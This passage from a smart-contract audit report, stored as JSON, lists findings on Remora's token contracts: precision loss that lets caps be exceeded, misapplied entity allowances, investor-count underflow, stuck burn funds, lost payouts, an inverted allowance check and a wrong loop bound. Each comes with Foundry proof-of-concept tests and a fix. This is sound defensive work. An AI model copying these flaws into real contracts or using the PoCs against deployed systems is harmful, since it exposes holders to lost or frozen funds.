bytes4[] memory sel = new bytes4[](1);\n        sel[0] = FiveFiftyRule.addToken.selector;\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), sel, ADMIN_TOKEN_ID);\n        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);\n\n        bytes4[] memory cs = new bytes4[](2);\n        cs[0] = bytes4(keccak256(\"setFiveFiftyCompliance(address)\"));\n        cs[1] = bytes4(keccak256(\"setLockUpTime(uint32)\"));\n        accessMgrProxy.setTargetFunctionRole(address(d_childTokenProxy), cs, ADMIN_TOKEN_ID);\n\n        // Wire fiveFiftyRule to domestic child; remove lockup\n        d_childTokenProxy.setFiveFiftyCompliance(address(fiveFiftyRule));\n        d_childTokenProxy.setLockUpTime(0);\n    }\n\n    function test_RoundingDown_Allows_ExtraEntityToken_ExceedingLookThroughCap() public {\n        // --------------------------\n        // Parameters we use for the PoC\n        // --------------------------\n        // Total supply: large, so we can transfer a very large amount to the catalyst without violating the cap.\n        // We'll target a 50% cap for the catalyst (to leave room for a huge direct transfer).\n        uint64 totalSupply = 10_000_000;\n        uint32 capPercent = 100_000;\n        uint64 capAmountMicros = totalSupply * capPercent;\n\n        uint64 equityMu = 333_334;\n        uint256 ENTITY_BAL = 1_500_000;\n        uint256 CATALYST_BAL = 700_000;\n\n        centralTokenProxy.mint(address(this), totalSupply);\n        fiveFiftyRule.addToken(address(centralTokenProxy));\n\n        // Choose a catalyst (a domestic user) and an entity address\n        address entity = getDomesticUser(0);\n        address catalyst = getDomesticUser(1);\n        address otherInvestor = getDomesticUser(2); // will never directly own any tokens in this example\n        address[] memory investors = new address[](2);\n        investors[0] = catalyst;\n        investors[1] = otherInvestor;\n\n        bytes4[] memory psel = new bytes4[](1);\n        psel[0] = bytes4(keccak256(\"setMaxPercentIndividual(address,uint32)\"));\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), psel, ADMIN_TOKEN_ID);\n        fiveFiftyRule.setMaxPercentIndividual(catalyst, capPercent);\n\n\n        bytes4[] memory esel = new bytes4[](2);\n        esel[0] = bytes4(keccak256(\"createEntity(address,address,uint64,uint64,address[])\"));\n        esel[1] = bytes4(keccak256(\"setCatalyst(bool,address,address,uint64,uint64)\"));\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), esel, ADMIN_TOKEN_ID);\n\n\n        uint64 calculatedAllowance = SafeCast.toUint64(totalSupply * 1e6 * capPercent / equityMu);\n        console2.log(\"calculatedAllowance: %s\", calculatedAllowance);\n\n        // Check that allowance is correct\n        uint256 userProportion = calculatedAllowance * equityMu / 1e6;\n        assertEq(userProportion, capAmountMicros - 1);\n\n        uint256 exposure = uint256(ENTITY_BAL)* 1e6 * equityMu / 1e6 + CATALYST_BAL * 1e6;\n\n        console2.log(\"\\n\\n*** INVARIANT VIOLATED ***\");\n        console2.log(\"exposure:   %s\", exposure);\n        console2.log(\"cap amount: %s\\n\\n\", capAmountMicros);\n        assertGe(exposure, capAmountMicros);\n\n\n\n        fiveFiftyRule.createEntity(entity, catalyst, equityMu, calculatedAllowance, investors);\n        centralTokenProxy.dynamicTransfer(entity, ENTITY_BAL);\n        logEntity(\"0\", entity);\n        logIndividual(\"entity 0\", entity);\n        logIndividual(\"catalyst 0\", catalyst);\n\n        centralTokenProxy.dynamicTransfer(catalyst, CATALYST_BAL);\n        logEntity(\"1\", entity);\n        logIndividual(\"entity 1\", entity);\n        logIndividual(\"catalyst 1\", catalyst);\n\n    }\n\n    function logEntity(string memory s, address entity) internal view {\n        FiveFiftyRule.EntityData memory ed = fiveFiftyRule.testing_entityData(entity);\n        console2.log(\"---  EntityData %s ---\", s );\n        console2.log(\"catalyst:     %s\", ed.catalyst);\n        console2.log(\"equity:       %s\", ed.equity);\n        console2.log(\"allowance:    %s\", ed.allowance);\n    }\n\n    function logIndividual(string memory s, address individual) internal view {\n        FiveFiftyRule.IndividualData memory id = fiveFiftyRule.testing_individualData(individual);\n        console2.log(\"---  IndividualData %s ---\", s);\n        console2.log(\"isEntity:         %s\", id.isEntity);\n        console2.log(\"numCatalyst:      %s\", id.numCatalyst);\n        console2.log(\"groupId:          %s\", id.groupId);\n        console2.log(\"customMaximum:    %s\", id.customMaximum);\n        console2.log(\"lastBalance:      %s\", id.lastBalance);\n\n    }\n}\n```\n\n**Recommended Mitigation:** Change the order of operators to `REMOTE_PERCENT_DENOMINATOR * amount / aData.equity`\n\n**Remora:** Fixed at commit [de9a89a](https://github.com/remora-projects/remora-dynamic-tokens/commit/de9a89a5eca6a5c9089bc07904662b8a64556dea)\n\n**Cyfrin:** Verified. Update order of operations, now, first multiply then divide.\n",
      "finding_id": null,
      "severity": "High",
      "start_line": 398,
      "end_line": 578,
      "description": null,
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded"
    },
    {
      "index": 6,
      "page_start": null,
      "heading": "Updating the entity allowance when the individual belongs to a group that has multiple catalysts for different entities can result in mistakenly modifying the allowance of entities where the individual is not even part of",
      "markdown": "### Updating the entity allowance when the individual belongs to a group that has multiple catalysts for different entities can result in mistakenly modifying the allowance of entities where the individual is not even part of\n\n**Description:** The problem is that entities that have nothing to do with either the sender or the receiver can end up getting their allowances modified or causing the tx to revert.\n\nThe system allows to register:\n- Individuals who belong to at most one group, or none.\n- Groups with multiple individuals\n- Entities with multiple individuals but only one catalyst.\n- Each group can have multiple individuals who are catalysts for different entities\n- Individuals in one group don't necessarily belong to all the same entities that the rest of the individuals belong to\n- One investor can be the catalyst for multiple entities.\n\nThis combination of possibilities allows for a scenario as follows:\n\n| Entity | Investors | Catalyst |\n|---|---|---|\n| EntityA | InvestorA, InvestorB | InvestorB |\n| EntityB | InvestorB, InvestorC | InvestorB |\n| EntityC | InvestorA, InvestorC | InvestorA |\n| EntityD | InvestorB, InvestorC | InvestorB |\n\n\n| Group | Investors | groups.numOfCatalysts |\n|---|---|---|\n| GroupA | InvestorA, InvestorB | 4 |\n| GroupB | InvestorC, InvestorD | 0 |\n\n\n| Investors | individualData.numOfCatalysts |\n| --|---|\n| InvestorA | 1 |\n| InvestorB | 3 |\n| InvestorC | 0 |\n| InvestorD| 0 |\n\n\nUsing the previous configuration, a transfer `from` InvestorA will end up affecting entityB and entityD because InvestorA and investorB are in the same group, and InvestorB is the catalyst on EntityB and EntityD (where InvestorC and InvestorD are part of and have nothing to do with InvestorA).\n\nThe issue occurs in these blocks of code on the `FiveFiftyRule::canTransfer` function:\n```solidity\n    function canTransfer(address from, address to, uint256 amount) external returns (bool) {\n        ...\n\n            if (iFrom.isEntity) {\n                entityData[from].allowance += SafeCast.toUint64(amount);\n//@audit-info => If `from` is on a group and that group has multiple catalysts!\n            } else if (gId != 0 && groups[gId].numCatalyst != 0) {\n                //@audit-info => iterates over ALL the individuals of the group `from` belongs to!\n                uint256 len = groups[gId].individuals.length;\n                for (uint256 i; i<len; ++i) {\n                    address ind = groups[gId].individuals[i];\n//@audit-issue => ENTERS If the current individual of the group (doesn't matter if this individual is the `from`) is a catalyst on at least one entity\n@>                  if (individualData[ind].numCatalyst != 0)\n                        _updateEntityAllowance(true, ind, amount);\n                }\n            }\n        ...\n\n    function _updateEntityAllowance(bool add, address inv, uint256 amount) internal returns (bool) {\n//@audit-info => total times the individual is a catalyst on != entities!\n        uint8 numCatalyst = individualData[inv].numCatalyst;\n\n//@audit-info => Entities the individual belongs to!\n        uint256 len = findEntity[inv].length;\n\n //@audit-info => iterates over the entities the individual belongs to\n        for (uint256 i; i<len; ++i) {\n//@audit-info => if individual is not a catalyst on any entity, break out of the loop!\n            if (numCatalyst == 0) break;\n\n//@audit-info => Loads the entity data the individual belongs to on the current indx being iterated\n            EntityData storage aData = entityData[findEntity[inv][i]];\n\n//@audit-info => if the catalyst of the entity is not the investor, continue to the next entity!\n            if (aData.catalyst != inv) continue;\n\n //@audit-info => If reaches here it means the investor is the catalyst of the entity!\n\n            --numCatalyst;\n\n            uint64 adjusted_amt = SafeCast.toUint64(\n                (REMORA_PERCENT_DENOMINATOR / aData.equity) * amount\n            );\n//@audit-issue => Modifies allowance or could cause a revert on an entity that has nothing to do with the actual `from` individual because the catalyst of that entity belonged to the same group as the `from` individual, which caused execution to get here, regardless that `from` individual is not even part of the entity being modified\n            if (add) aData.allowance += adjusted_amt;\n            else if (adjusted_amt > aData.allowance) return false;\n            else aData.allowance -= adjusted_amt;\n        }\n        return true;\n    }\n\n```\n\n\n**Impact:** This bug can lead to two different paths:\n1. On the sender - When ALL the entities have enough allowance, then the allowances for entities where the individual doesn't belong can result in being mistakenly modified.\n2. On the receiver - When one of the entities doesn't have enough allowance, the tx will revert.\n\n**Recommended Mitigation:** Consider refactoring the update of allowances to entities so that they do not fall in this scenario. Consider not updating the allowances of entities where the `from` or `to` are not part of.\n\n**Remora:** Acknowledged. Groups should be seen as individuals, so if individual A and B are in the same group, but are in different entities, either of their transfers should affect all entities that are tied to that group one way or another.\n\n**Cyfrin:** Verified.\n\n\\clearpage\n",
      "finding_id": null,
      "severity": "High",
      "start_line": 578,
      "end_line": 683,
      "description": null,
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Updating the entity allowance when the individual belongs to a group that has multiple catalysts for different entities can result in mistakenly modifying the allowance of entities where the individual is not even part of"
    },
    {
      "index": 7,
      "page_start": null,
      "heading": "Self transfer of all child tokens results in decement of `ChildToken.totalInvestors` storage variable",
      "markdown": "### Self transfer of all child tokens results in decement of `ChildToken.totalInvestors` storage variable\n\n**Description:** Similar to Issue [*Frontrunning call to `ChildToken::resolveUser` and transferring all of the oldUser's `childToken` balance causes the `totalInvestor` counter to be decremented twice*](#frontrunning-call-to-childtokenresolveuser-and-transferring-all-of-the-oldusers-childtoken-balance-causes-the-totalinvestor-counter-to-be-decremented-twice), if `user` calls `ChildToken::transfer(user, <balance of user>)` this will result in `totalInvestors` being decremented.\n\nThis is because the override of `_update` determines the decrements/increments based on the balance _before_ the transfer.\n\n```solidity\n    function _update(\n        address from,\n        address to,\n        uint256 value\n    ) internal override {\n@1>     if (from != address(0) && balanceOf(from) - value == 0) --totalInvestors;\n@2>     if (to != address(0) && balanceOf(to) == 0) ++totalInvestors;\n...\n```\n\n- Line `@1>` causes the `totalInvestors` to be decremented, but\n- Line `@2>` does not cause an increment since `balanceOf(to)` is the before-transfer balance\n\n\n**Impact:** The impact is minimal in most cases, as `totalInvestors` is only used for informational purposes.\nHowever, if it is done enough times it will lead to underflows precisely when:\n- `totalInvestors == 0`, and\n- a user is transferring all their tokens to another user\n\n**Proof of Concept:** Add the following test to `CentralTokenTest.t.sol`\n\n```solidity\n\n    function test_cyfrin_selfTransferDecrements() public {\n        address user = getDomesticUser(1);\n        uint32 DEFAULT_LOCK_TIME = 365 days;\n\n        // Seed: old user has 3 tokens (locked by default on mint)\n        centralTokenProxy.mint(address(this), uint64(3));\n        centralTokenProxy.dynamicTransfer(user, 3);\n        assertEq(d_childTokenProxy.balanceOf(user), 3);\n        assertEq(d_childTokenProxy.totalInvestors(), 1);\n\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME); // warp to unlock tokens\n        vm.prank(user);\n        d_childTokenProxy.transfer(user, 3);\n\n        assertEq(d_childTokenProxy.totalInvestors(), 0);\n        assertEq(d_childTokenProxy.balanceOf(user), 3);\n\n        // Do it one more time and we get a revert\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME);  // warp to unlock tokens\n        vm.prank(user);\n        vm.expectRevert(); // expect underflow\n        d_childTokenProxy.transfer(user, 3);\n    }\n```\n\n**Recommended Mitigation:** If `from == to` do nothing to the investor count.\n\n```diff\n+       if (from != to) {\n            if (from != address(0) && balanceOf(from) - value == 0) --totalInvestors;\n            if (to != address(0) && balanceOf(to) == 0) ++totalInvestors;\n+       }\n\n        super._update(from, to, value);\n```\n\n**Remora:** Fixed at commit [b612c87](https://github.com/remora-projects/remora-dynamic-tokens/commit/b612c8735b9da1e563af7b0071f3da0c67d60702).\n\n**Cyfrin:** Verified. `totalInvestors` counter is not modified if `from` and `to` are the same address.\n",
      "finding_id": null,
      "severity": "Medium",
      "start_line": 686,
      "end_line": 757,
      "description": null,
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Self transfer of all child tokens results in decement of `ChildToken.totalInvestors` storage variable"
    },
    {
      "index": 8,
      "page_start": null,
      "heading": "After disabling burning with `CentralToken::disableBurning` calling `PaymentSettler::enableBurning` leads to stuck funds",
      "markdown": "### After disabling burning with `CentralToken::disableBurning` calling `PaymentSettler::enableBurning` leads to stuck funds\n\n**Description:** Burning of child tokens can be disabled, even after `PaymentSettler::enableBurning(...)` is called by and admin calling `CentralToken::disableBurning()` directly.\n\nThe correct way to re-enable burning is to call `CentralToken::enableBurning(burnPayout)` (even though the `burnPayout` parameter is ignored in this case).\n\nHowever, a mistake that could occur is that admin calls `PaymentSettler::enableBurning()` instead. All though this may not be expected, this succeeds because there are no checks against the `TokenData` for  central token and instead, these checks are deferred to the external call to `CentralToken.enableBurning` on [PaymentSettler.sol#L184](https://github.com/remora-projects/remora-dynamic-tokens/blob/6365a9e970758605f973ce0319236805e4188986/contracts/CoreContracts/PaymentSettler.sol#L184).\n\nUnfortunately the logic of `CentralToken::enableBurning` will _overwrite_ the `totalBurnPayout` when called from the `PaymentSettler` contract.\n\n```solidity\n    function enableBurning(uint64 burnPayout) external nonReentrant {\n        address sender = _msgSender();\n        if (sender != paymentSettler)\n            _checkCanCall(sender, _msgData());\n@>      else totalBurnPayout = burnPayout;\n    ...\n```\n\n- The value of each token is calculated as `totalBurnPayout / preBurnSupply`\n- Let `B1`/`B2` be the funds added on the first/second call to `PaymentSettler::enableBurning`\n- Let `S` be the `preBurnSupply`\n- Assume `x` tokens were burned before the disable. Assume `x < S`\n- Assume the remaining `S - x` tokens are burned after re-enable\n- Then total value of all burned tokens is  `(x * B1 / S) + (S - x)*B2 / S`\n- Yet the total value put into `PaymentSettler` for burning was `B1 + B2`\n\nThe stablecoin value left in the `PaymentSettler` contract\n\n```\n   (B1 + B2) - (x * B1 / S + (S - x)*B2/S)\n== (B1 + B2) - (x * B1 / S + S * B2 / S - x * B2 / S)\n== (B1 + B2) - (x/S* (B1 - B2) + B2)\n== B1 - x/S * (B1 - B2)\n```\n\n1. If `B1 - B2 < 0` then this is clearly positive\n2. If `B1 - B2 > 0` then the maximum value of `x/S * (B1 - B2)` happens when `B2 == 0`. But since `x/S < 1` we have `B1 - x/S*B1 > 0`\n\nThus, funds will always become stuck in the contract.\n\n**Impact:** Funds become stuck in the contract when burning is disabled and then re-enabled with `PaymentSettler::enableBurning`\n\n**Proof of Concept:** Add the following to `PaymentSettlerTest.t.sol` Assert statements will hold even if constants (in capital letters) are changed.\n\n```solidity\n    function test_cyfrin_EnableAfterDisableLeadsToStuckFunds() public {\n        address user0 = getDomesticUser(0);\n        address user1 = getDomesticUser(1);\n        uint64 BURN_FUNDS_0 = 1_000_000e6;\n        uint64 BURN_FUNDS_1 = 700_000e6;\n\n        uint64 INITIAL_SUPPLY = 10_000;\n        uint64 BURN_AMOUNT = 3000;\n\n        centralTokenProxy.mint(address(this), INITIAL_SUPPLY);\n        centralTokenProxy.dynamicTransfer(user0, BURN_AMOUNT);\n        centralTokenProxy.dynamicTransfer(user1, INITIAL_SUPPLY - BURN_AMOUNT);\n\n        (uint128 usdBal0 , , bool burnEnabled0,) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBal0, 0);\n        assertEq(burnEnabled0, false);\n\n        // initiateBurning\n        paySettlerProxy.initiateBurning(address(centralTokenProxy));\n        skip(1 days + 1);\n\n        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);\n        paySettlerProxy.enableBurning(address(centralTokenProxy), address(this), BURN_FUNDS_0);\n        (uint128 usdBal1,,bool burnEnabled1,) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBal1, 1_000_000e6);\n        assertEq(centralTokenProxy.totalSupply(), INITIAL_SUPPLY);\n        assertEq(centralTokenProxy.preBurnSupply(), INITIAL_SUPPLY);\n        assertEq(centralTokenProxy.totalBurnPayout(), BURN_FUNDS_0);\n        assertEq(burnEnabled1, true);\n\n        vm.startPrank(user0);\n        d_childTokenProxy.burn(); // burns INITIAL_SUPPLY - BURN_AMOUNT tokens\n        vm.stopPrank();\n\n        (uint128 usdBal2,,,) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBal2, BURN_FUNDS_0 - BURN_AMOUNT * BURN_FUNDS_0 / INITIAL_SUPPLY);\n        assertEq(centralTokenProxy.totalSupply(), INITIAL_SUPPLY - BURN_AMOUNT);\n        assertEq(centralTokenProxy.preBurnSupply(), INITIAL_SUPPLY);\n        assertEq(centralTokenProxy.totalBurnPayout(), BURN_FUNDS_0);\n\n        // Disable Burning\n        centralTokenProxy.disableBurning();\n        (,,bool burnEnabled2_5,) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(burnEnabled2_5, true); // PaymentSettler still reports that the burn is enabled\n\n        paySettlerProxy.enableBurning(address(centralTokenProxy), address(this), BURN_FUNDS_1);\n        (uint128 usdBal3 , , , bool burnEnabled3) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBal3, usdBal2 + BURN_FUNDS_1);\n        assertTrue(burnEnabled3);\n        uint256 totalSupply3 = centralTokenProxy.totalSupply();\n        uint64  preBurnSupply3 = centralTokenProxy.preBurnSupply();\n        uint64  totalBurnPayout3 = centralTokenProxy.totalBurnPayout();\n        uint256 valueOfTokens = totalSupply3 * totalBurnPayout3 / preBurnSupply3;\n\n        assertEq(totalSupply3, INITIAL_SUPPLY - BURN_AMOUNT);\n        assertEq(preBurnSupply3, INITIAL_SUPPLY);\n        assertEq(totalBurnPayout3, BURN_FUNDS_1);\n\n        vm.startPrank(user1);\n        d_childTokenProxy.burn(); // burn all remaining tokens\n        vm.stopPrank();\n\n        (uint128 usdBalEnd , , , ) = paySettlerProxy.tokenData(address(centralTokenProxy));\n        assertEq(usdBalEnd, usdBal2 + BURN_FUNDS_1 - valueOfTokens);\n        assertEq(int64(uint64(usdBalEnd)), int64(BURN_FUNDS_0) - int64(BURN_AMOUNT) * (int64(BURN_FUNDS_0) - int64(BURN_FUNDS_1))/ int64(INITIAL_SUPPLY));\n        assertEq(centralTokenProxy.totalSupply(), 0);\n    }\n```\n\n**Recommended Mitigation:** It is recommended that re-enabling burning via `PaymentSettler::enableBurning` is completely disabled perhaps by just adding a check\n\n```diff\n+    error TokenBurningAlreadyEnabled();\n```\n\n```diff\n    function enableBurning(\n        address token,\n        address fundingWallet,\n        uint64 value\n    ) external nonReentrant restricted {\n        if (value == 0) revert InvalidValuePassed();\n        TokenData storage t = tokenData[token];\n+       if (t.burnEnabled) revert TokenBurningAlreadyEnabled();\n        if (!t.active) revert InvalidTokenAddress();\n...\n```\n\n**Remora:** Fixed at commit [45e9745](https://github.com/remora-projects/remora-dynamic-tokens/commit/45e974546e47d4e8248374b31f0cc01d07dcf04b)\n\n**Cyfrin:** Verified. Added a check to prevent enabling burning more than once.\n",
      "finding_id": null,
      "severity": "Medium",
      "start_line": 757,
      "end_line": 897,
      "description": null,
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "After disabling burning with `CentralToken::disableBurning` calling `PaymentSettler::enableBurning` leads to stuck funds"
    },
    {
      "index": 9,
      "page_start": null,
      "heading": "Resolving a frozen investor causes all the pending payouts for the entire time the investor was frozen to be lost",
      "markdown": "### Resolving a frozen investor causes all the pending payouts for the entire time the investor was frozen to be lost\n\n**Description:** When an investor is frozen, they do not receive payouts while the freeze is active. However, once the sanction is lifted, the investor is entitled to receive the accumulated payouts for the entire duration of the freeze.\n\nResolving a frozen user does not unfreeze the investor before resolving the pending payouts. This means that the payouts of the investor will be calculated up to the `payoutIndex` at which they were frozen; any subsequent payouts will not be included in the calculation.\n```solidity\n//ChildToken.sol//\n    function resolveUser(address oldAddress, address newAddress) external nonReentrant restricted {\n        ...\n        _resolvePay(oldAddress, newAddress); // moves any unclaimed payouts to new account\n        ...\n    }\n\n//DividendManager.sol//\n    function _resolvePay(address oldAddress, address newAddress) internal {\n//@audit => Payouts as calculated on payoutBalance() from oldAddress are migrated to newAddress\n@>      _getHolderManagementStorage()._resolvedPay[newAddress] = SafeCast.toUint128(_claimPayout(oldAddress));\n        emit PaymentResolved(oldAddress, newAddress);\n    }\n\n    function _claimPayout(\n        address holder\n    ) internal returns (uint256 payoutAmount) {\n        HolderManagementStorage storage $ = _getHolderManagementStorage();\n        payoutAmount = payoutBalance(holder);\n\n        ...\n    }\n\n    function payoutBalance(address holder) public returns (uint256) {\n        ...\n\n        uint256 payoutAmount;\n//@audit => Payouts for frozen investors are paid out up to the index when they were frozen\n @>     uint16 payRangeStart = rHolderStatus.isFrozen\n            ? rHolderStatus.frozenIndex - 1\n            : currentPayoutIndex - 1;\n        ...\n        for (uint16 i = payRangeStart; i >= payRangeEnd; --i) {\n            ...\n        }\n\n        ...\n    }\n```\n\nGiven that resolving a user causes the entire balance to be transferred to the new address, the `oldAddress` will get its user data deleted because on the `DividenManager::_updateHolders`, the `from` (oldAddress) won't have any balance, any payouts, nor calculatedPayout, both of them were reset to 0 in the call to `_claimPayout()` triggered from `_resolvePay()`\n```solidity\n//ChildToken.sol//\n    function resolveUser(address oldAddress, address newAddress) external nonReentrant restricted {\n        ...\n        _resolvePay(oldAddress, newAddress); // moves any unclaimed payouts to new account\n        ...\n//@audit => Transfer all the balance of the oldAddress\n        uint256 value = balanceOf(oldAddress);\n        _validateBalance(false, false, oldAddress, value);\n        _validateCompliance(false, true, oldAddress, newAddress, value);\n@>      super._transfer(oldAddress, newAddress, value); // tokens already locked with _newAccountSameLocks\n    }\n\n\n\n```\n\nThis means the new address will receive all the old address tokens, but the payouts for the duration of the freeze on the old address will be lost.\n\n**Impact:** Resolving a frozen user causes all their pending payouts for the duration of their freeze to be lost.\n\n\n**Recommended Mitigation:** Add to the `ChildToken::resolveUser` logic to verify if the oldAddress is frozen; if so, unfreeze it before resolving the pending payments. And, at the end of the execution, consider freezing the new address in case the old address was frozen.\n\n**Remora:** Fixed at commit [c729f6e](https://github.com/remora-projects/remora-dynamic-tokens/commit/c729f6eb61235efd02095cecff3b2b3a82956257)\n\n**Cyfrin:** Verified. Added a validation before calculating pending payouts to check if the `oldAddress` is frozen. If so, `oldAddress` is unfrozen, and `newAddress` is frozen. This allows pending payouts for the `oldAddress` to be calculated until the current `payoutIndex`.\n",
      "finding_id": null,
      "severity": "Medium",
      "start_line": 897,
      "end_line": 973,
      "description": null,
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Resolving a frozen investor causes all the pending payouts for the entire time the investor was frozen to be lost"
    },
    {
      "index": 10,
      "page_start": null,
      "heading": "Allowance check in `FiveFiftyRule::canTransfer` is inverted",
      "markdown": "### Allowance check in `FiveFiftyRule::canTransfer` is inverted\n\n**Description:** The following snippet from `FiveFiftyRule::canTransfer` has inverted logic.\n\n```solidity\n            if (iTo.isEntity) { // if entity\n@>              if (entityData[to].allowance <= amount) {\n                    entityData[to].allowance -= SafeCast.toUint64(amount);\n\n                    iTo.lastBalance += SafeCast.toUint64(amount);\n                    emit FiveFiftyApproved(from, to, amount);\n                    return true;\n                } else revert ();\n            }\n```\n\nThis is also present in `FiveFiftyRule::checkCanTransfer`.\n\n**Impact:** No transfers to entities are possible except in the rare cases that `allowance == amount`\nIn the other two cases the function will revert, but for different reasons.\n- If `allowance  > amount` then function will revert due to the else-branch\n- If `allowance < amount` then the function will revert due to underflow\n\n**Recommended Mitigation:**\n```diff\n            if (iTo.isEntity) { // if entity\n-               if (entityData[to].allowance <= amount) {\n+               if (entityData[to].allowance >= amount) {\n                    entityData[to].allowance -= SafeCast.toUint64(amount);\n```\n\n```diff\n        if (iData.isEntity)\n-           return entityData[to].allowance <= amount;\n+           return entityData[to].allowance >= amount;\n```\n\n**Remora:** Fixed at commit [a69e893](https://github.com/remora-projects/remora-dynamic-tokens/commit/a69e89357e5180150894b8d8b24f273bdf45893c)\n\n**Cyfrin:** Verified. Comparison operator has been inverted to use the correct operator.\n",
      "finding_id": null,
      "severity": "Medium",
      "start_line": 973,
      "end_line": 1015,
      "description": null,
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Allowance check in `FiveFiftyRule::canTransfer` is inverted"
    },
    {
      "index": 11,
      "page_start": null,
      "heading": "`FiveFiftyRule::_removeFromEntity` will revert or not work in some cases",
      "markdown": "### `FiveFiftyRule::_removeFromEntity` will revert or not work in some cases\n\n**Description:** The marked line in the code below is using the wrong length `len`. It should be `eLen`.\n\n```solidity\n    function _removeFromEntity(\n        address entity,\n        address[] calldata investors\n    ) internal {\n        uint256 len = investors.length;\n        for (uint256 i; i<len; ++i) {\n            address[] storage ens = findEntity[investors[i]];\n            uint256 eLen = ens.length;\n@>          for (uint256 j; j<len; ++j) {\n                if (ens[j] == entity) {\n                    if (j != eLen-1 && eLen > 1)\n                        ens[j] = ens[eLen-1];\n                    ens.pop();\n                    break;\n                }\n            }\n        }\n    }\n```\n\nWhen `len > eLen` this will lead to reverts if the investor is not found when `j < eLen`.\nThe result is spurious reverts.\n\n**Impact:** Functions impacted by the reverts are  `deleteEntity` and `removeFromEntity`.\n\nFor the `removeFromEntity` case it's possible to repeatedly call it where the `investors` parameter is an array of length 1.\n\nHowever, for the `deleteEntity` cases this is not possible. The `investors` parameter must contain all of the investors in the entity. If it does not then `findEntity` mapping will still contain entries that it shouldn't.\n\n**Proof of Concept:** Add this to `FiveFiftyRuleTest.t.sol`\n\n```\nimport \"forge-std/Test.sol\";\n```\n\nand also\n\n```solidity\n    function test_cyfrin_removeEntity_indexBug() public {\n        address user0 = getDomesticUser(0);\n        address user1 = getDomesticUser(1);\n        address user2 = getDomesticUser(2);\n        address entity = getDomesticUser(3);\n\n\n        address[] memory investors = new address[](3);\n        investors[0] = user0;\n        investors[0] = user1;\n        investors[0] = user2;\n\n        fiveFiftyProxy.createEntity(entity, user0, 1e6, 1_000_000, investors);\n\n        address[] memory investorsToRemove = new address[](2);\n        investorsToRemove[0] = user0;\n        investorsToRemove[1] = user1;\n\n        // since investorsToRemove.length == 2 and entities.length == 1 we get a revert\n        vm.expectRevert(stdError.indexOOBError);\n        fiveFiftyProxy.removeFromEntity(entity, investorsToRemove);\n\n    }\n```\n\n**Recommended Mitigation:**\n```diff\n-          for (uint256 j; j<len; ++j) {\n+          for (uint256 j; j<eLen; ++j) {\n```\n\n**Remora**\nFixed at commit [5ed4324](https://github.com/remora-projects/remora-dynamic-tokens/commit/5ed432479dec26cb1bcb7484e765eb7319f76c0a)\n\n**Cyfrin:** Verified.\n",
      "finding_id": null,
      "severity": "Medium",
      "start_line": 1015,
      "end_line": 1095,
      "description": null,
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "`FiveFiftyRule::_removeFromEntity` will revert or not work in some cases"
    },
    {
      "index": 12,
      "page_start": null,
      "heading": "Calling `PaymentSettler::setStableCoin` can lead to inability of holders to claim funds and old stablecoin being trapped in the contract",
      "markdown": "### Calling `PaymentSettler::setStableCoin` can lead to inability of holders to claim funds and old stablecoin being trapped in the contract\n\n**Description:** An admin can call `PaymentSettler::setStablecoin` at any time. As the code is currently design this should only be done when the stablecoin balance of the contract is zero, which is a very rare occurrence given that many tokens will be at various stages of the their lifecycle.\n\nFor instance, if `setStablecoin` were called in the middle of the burning phase of a central token, it would lead to the inability of some users to burn their tokens. This also holds if there are outstanding payouts to claim before burning is enabled.\n\nAs it is not unknown for stablecoins to become de-pegged (even [USDC de-pegged for a few hours](https://cointelegraph.com/news/usdc-depegs-as-circle-confirms-3-3b-stuck-with-silicon-valley-bank)), a method for migrating from one stablecoin to another must be implemented.\n\n**Impact:** Changing the stablecoin may well become necessary if the current stablecoin loses its value. The problem then is that all currently active central tokens become affected by the change (and the existing funds become stuck).\n\nThe impact is two-fold:\n1.  Any existing stable coins are trapped in the contract as there is no way to get them out.\n2. Users are unable to either claim payouts or burn their tokens.\n\nAs this is a High Impact, but Low Likelihood bug its impact has been assessed as Medium.\n\n**Proof of Concept:** Add the following test to `PaymentSettlerTest.t.sol`. It demonstrates that a user would be unable to burn their tokens if `setStablecoin`\n\n```solidity\n    function test_cyfrin_setStablecoinCanLeadToDOS() public {\n        address user0 = getDomesticUser(0);\n        address user1 = getDomesticUser(1);\n        address central = address(centralTokenProxy);\n\n        centralTokenProxy.mint(address(this), 10_000);\n        centralTokenProxy.dynamicTransfer(user0, 5_000);\n        centralTokenProxy.dynamicTransfer(user1, 5_000);\n\n        paySettlerProxy.initiateBurning(central);\n        vm.warp(1 days + 1);\n\n        IERC20(address(stableCoin)).approve(address(paySettlerProxy), 1_000_000e6);\n        paySettlerProxy.enableBurning(central, address(this), 1_000_000e6);\n\n        // User 0 burns their tokens\n        vm.prank(user0); d_childTokenProxy.burn();\n\n        Stablecoin newStableCoin = new Stablecoin(\"DAI\", \"DAI\", type(uint256).max/1e6, 6);\n        paySettlerProxy.setStablecoin(address(newStableCoin));\n\n        vm.startPrank(user1);\n        